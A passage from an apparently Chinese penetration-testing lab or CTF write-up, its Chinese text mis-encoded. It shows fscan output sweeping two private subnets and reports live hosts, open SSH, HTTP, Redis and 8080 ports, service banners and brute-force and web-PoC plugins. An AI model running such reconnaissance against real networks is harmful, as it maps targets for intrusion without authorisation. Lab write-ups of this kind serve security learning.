</span></span><span class=line><span class=cl><span class=err>â”‚</span> <span class=o>/</span> <span class=o>/</span><span class=n>_</span>\\<span class=n>_____</span>\<span class=n>__</span> \ <span class=p>(</span><span class=n>__</span><span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=n>_</span><span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=n>__</span><span class=o>|</span>   <span class=o>&lt;</span>     <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span> \<span class=n>____</span><span class=o>/</span>     <span class=o>|</span><span class=n>___</span><span class=o>/</span>\<span class=n>___</span><span class=o>|</span><span class=n>_</span><span class=o>|</span>  \<span class=n>__</span><span class=p>,</span><span class=n>_</span><span class=o>|</span>\<span class=n>___</span><span class=o>|</span><span class=n>_</span><span class=o>|</span>\<span class=n>_</span>\    <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</span></span><span class=line><span class=cl>      <span class=n>Fscan</span> <span class=n>Version</span><span class=p>:</span> <span class=mf>2.0.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æš´åŠ›ç ´è§£çº¿ç¨‹æ•°</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹ä¿¡æ¯æ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>CIDRèŒƒå›´</span><span class=p>:</span> <span class=mf>172.20.0.0</span><span class=o>-</span><span class=mf>172.20.0.255</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>ç”ŸæˆIPèŒƒå›´</span><span class=p>:</span> <span class=mf>172.20.0.0</span><span class=o>.%</span><span class=err>!</span><span class=n>d</span><span class=p>(</span><span class=n>string</span><span class=o>=</span><span class=mf>172.20.0.255</span><span class=p>)</span> <span class=o>-</span> <span class=o>%</span><span class=err>!</span><span class=n>s</span><span class=p>(</span><span class=n>MISSING</span><span class=p>)</span><span class=o>.%</span><span class=err>!</span><span class=n>d</span><span class=p>(</span><span class=n>MISSING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>è§£æCIDR</span> <span class=mf>172.20.0.20</span><span class=o>/</span><span class=mi>24</span> <span class=o>-&gt;</span> <span class=n>IPèŒƒå›´</span> <span class=mf>172.20.0.0</span><span class=o>-</span><span class=mf>172.20.0.255</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡</span><span class=p>:</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹ä¸»æœºæ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>172.20.0.1</span>      <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>172.20.0.10</span>     <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>172.20.0.20</span>     <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å­˜æ´»ä¸»æœºæ•°é‡</span><span class=p>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æœ‰æ•ˆç«¯å£æ•°é‡</span><span class=p>:</span> <span class=mi>233</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>172.20.0.1</span><span class=p>:</span><span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>172.20.0.10</span><span class=p>:</span><span class=mi>3000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>172.20.0.1</span><span class=p>:</span><span class=mi>3000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span><span class=mi>57</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>172.20.0.1</span><span class=p>:</span><span class=mi>22</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>ssh</span><span class=p>]</span> <span class=n>ç‰ˆæœ¬</span><span class=p>:</span><span class=mf>9.2</span><span class=n>p1</span> <span class=n>Debian</span> <span class=mi>2</span><span class=o>+</span><span class=n>deb12u7</span> <span class=n>äº§å“</span><span class=p>:</span><span class=n>OpenSSH</span> <span class=n>ç³»ç»Ÿ</span><span class=p>:</span><span class=n>Linux</span> <span class=n>ä¿¡æ¯</span><span class=p>:</span><span class=n>protocol</span> <span class=mf>2.0</span> <span class=n>Banner</span><span class=p>:[</span><span class=n>SSH</span><span class=o>-</span><span class=mf>2.0</span><span class=o>-</span><span class=n>OpenSSH_9</span><span class=mf>.2</span><span class=n>p1</span> <span class=n>Debian</span><span class=o>-</span><span class=mi>2</span><span class=o>+</span><span class=n>deb12u7</span><span class=o>.</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>172.20.0.10</span><span class=p>:</span><span class=mi>3000</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>172.20.0.1</span><span class=p>:</span><span class=mi>3000</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å­˜æ´»ç«¯å£æ•°é‡</span><span class=p>:</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹æ¼æ´æ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>åŠ è½½çš„æ’ä»¶</span><span class=p>:</span> <span class=n>ssh</span><span class=p>,</span> <span class=n>webpoc</span><span class=p>,</span> <span class=n>webtitle</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç½‘ç«™æ ‡é¢˜</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.20.0.10</span><span class=p>:</span><span class=mi>3000</span>   <span class=n>çŠ¶æ€ç </span><span class=p>:</span><span class=mi>200</span> <span class=n>é•¿åº¦</span><span class=p>:</span><span class=mi>7801</span>   <span class=n>æ ‡é¢˜</span><span class=p>:</span><span class=n>æ™ºèƒ½å•†åŸ</span> <span class=o>-</span> <span class=n>æ‚¨çš„è´­ç‰©å¤©å ‚</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>08</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç½‘ç«™æ ‡é¢˜</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>172.20.0.1</span><span class=p>:</span><span class=mi>3000</span>    <span class=n>çŠ¶æ€ç </span><span class=p>:</span><span class=mi>200</span> <span class=n>é•¿åº¦</span><span class=p>:</span><span class=mi>7801</span>   <span class=n>æ ‡é¢˜</span><span class=p>:</span><span class=n>æ™ºèƒ½å•†åŸ</span> <span class=o>-</span> <span class=n>æ‚¨çš„è´­ç‰©å¤©å ‚</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>10</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æ‰«æå·²å®Œæˆ</span><span class=p>:</span> <span class=mi>5</span><span class=o>/</span><span class=mi>5</span>
</span></span></code></pre></td></tr></table></div></div><p>æ²¡çœ‹åˆ°ä»€ä¹ˆç‰¹æ®Šçš„ï¼Œæ‰«æä¸€ä¸‹192çš„æ®µ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>root</span><span class=nd>@ff7bf03fb11e</span><span class=p>:</span><span class=o>/</span><span class=n>tmp</span><span class=c1># ./fscan -h 192.168.100.10/24</span>
</span></span><span class=line><span class=cl><span class=err>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>    <span class=n>___</span>                              <span class=n>_</span>        <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>   <span class=o>/</span> <span class=n>_</span> \     <span class=n>___</span>  <span class=n>___</span> <span class=n>_</span> <span class=n>__</span> <span class=n>__</span> <span class=n>_</span>  <span class=n>___</span><span class=o>|</span> <span class=o>|</span> <span class=n>__</span>    <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>  <span class=o>/</span> <span class=o>/</span><span class=n>_</span>\<span class=o>/</span><span class=n>____</span><span class=o>/</span> <span class=n>__</span><span class=o>|/</span> <span class=n>__</span><span class=o>|</span> <span class=s1>&#39;__/ _` |/ __| |/ /    â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span> <span class=o>/</span> <span class=o>/</span><span class=n>_</span>\\<span class=n>_____</span>\<span class=n>__</span> \ <span class=p>(</span><span class=n>__</span><span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=n>_</span><span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=n>__</span><span class=o>|</span>   <span class=o>&lt;</span>     <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span> \<span class=n>____</span><span class=o>/</span>     <span class=o>|</span><span class=n>___</span><span class=o>/</span>\<span class=n>___</span><span class=o>|</span><span class=n>_</span><span class=o>|</span>  \<span class=n>__</span><span class=p>,</span><span class=n>_</span><span class=o>|</span>\<span class=n>___</span><span class=o>|</span><span class=n>_</span><span class=o>|</span>\<span class=n>_</span>\    <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</span></span><span class=line><span class=cl>      <span class=n>Fscan</span> <span class=n>Version</span><span class=p>:</span> <span class=mf>2.0.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æš´åŠ›ç ´è§£çº¿ç¨‹æ•°</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹ä¿¡æ¯æ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>CIDRèŒƒå›´</span><span class=p>:</span> <span class=mf>192.168.100.0</span><span class=o>-</span><span class=mf>192.168.100.255</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>ç”ŸæˆIPèŒƒå›´</span><span class=p>:</span> <span class=mf>192.168.100.0</span><span class=o>.%</span><span class=err>!</span><span class=n>d</span><span class=p>(</span><span class=n>string</span><span class=o>=</span><span class=mf>192.168.100.255</span><span class=p>)</span> <span class=o>-</span> <span class=o>%</span><span class=err>!</span><span class=n>s</span><span class=p>(</span><span class=n>MISSING</span><span class=p>)</span><span class=o>.%</span><span class=err>!</span><span class=n>d</span><span class=p>(</span><span class=n>MISSING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>è§£æCIDR</span> <span class=mf>192.168.100.10</span><span class=o>/</span><span class=mi>24</span> <span class=o>-&gt;</span> <span class=n>IPèŒƒå›´</span> <span class=mf>192.168.100.0</span><span class=o>-</span><span class=mf>192.168.100.255</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡</span><span class=p>:</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>30</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹ä¸»æœºæ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>192.168.100.1</span>   <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>192.168.100.10</span>  <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>192.168.100.20</span>  <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>192.168.100.30</span>  <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç›®æ ‡</span> <span class=mf>192.168.100.40</span>  <span class=n>å­˜æ´»</span> <span class=p>(</span><span class=n>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å­˜æ´»ä¸»æœºæ•°é‡</span><span class=p>:</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>æœ‰æ•ˆç«¯å£æ•°é‡</span><span class=p>:</span> <span class=mi>233</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>192.168.100.1</span><span class=p>:</span><span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>192.168.100.20</span><span class=p>:</span><span class=mi>6379</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>192.168.100.40</span><span class=p>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>192.168.100.30</span><span class=p>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç«¯å£å¼€æ”¾</span> <span class=mf>192.168.100.1</span><span class=p>:</span><span class=mi>3000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>192.168.100.1</span><span class=p>:</span><span class=mi>22</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>ssh</span><span class=p>]</span> <span class=n>ç‰ˆæœ¬</span><span class=p>:</span><span class=mf>9.2</span><span class=n>p1</span> <span class=n>Debian</span> <span class=mi>2</span><span class=o>+</span><span class=n>deb12u7</span> <span class=n>äº§å“</span><span class=p>:</span><span class=n>OpenSSH</span> <span class=n>ç³»ç»Ÿ</span><span class=p>:</span><span class=n>Linux</span> <span class=n>ä¿¡æ¯</span><span class=p>:</span><span class=n>protocol</span> <span class=mf>2.0</span> <span class=n>Banner</span><span class=p>:[</span><span class=n>SSH</span><span class=o>-</span><span class=mf>2.0</span><span class=o>-</span><span class=n>OpenSSH_9</span><span class=mf>.2</span><span class=n>p1</span> <span class=n>Debian</span><span class=o>-</span><span class=mi>2</span><span class=o>+</span><span class=n>deb12u7</span><span class=o>.</span><span class=p>]</span>
